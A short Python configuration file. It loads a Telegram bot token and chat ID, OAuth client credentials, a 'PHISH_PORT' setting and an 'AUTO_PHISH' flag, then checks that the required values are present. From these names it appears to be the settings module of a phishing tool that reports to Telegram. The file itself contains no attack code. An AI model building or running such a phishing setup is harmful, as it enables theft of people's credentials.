import os
from dotenv import load_dotenv

# Load env FIRST
load_dotenv()

# Read config AFTER loading
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")

PHISH_PORT = int(os.getenv("PHISH_PORT", 5000))
AUTO_PHISH = True

# Validate AFTER everything is loaded
required = {
    "TELEGRAM_BOT_TOKEN": TELEGRAM_BOT_TOKEN,
    "TELEGRAM_CHAT_ID": TELEGRAM_CHAT_ID,
    "CLIENT_ID": CLIENT_ID,
    "CLIENT_SECRET": CLIENT_SECRET,
}

missing = [k for k, v in required.items() if not v]

if missing:
    raise ValueError(f"Missing .env vars: {missing}")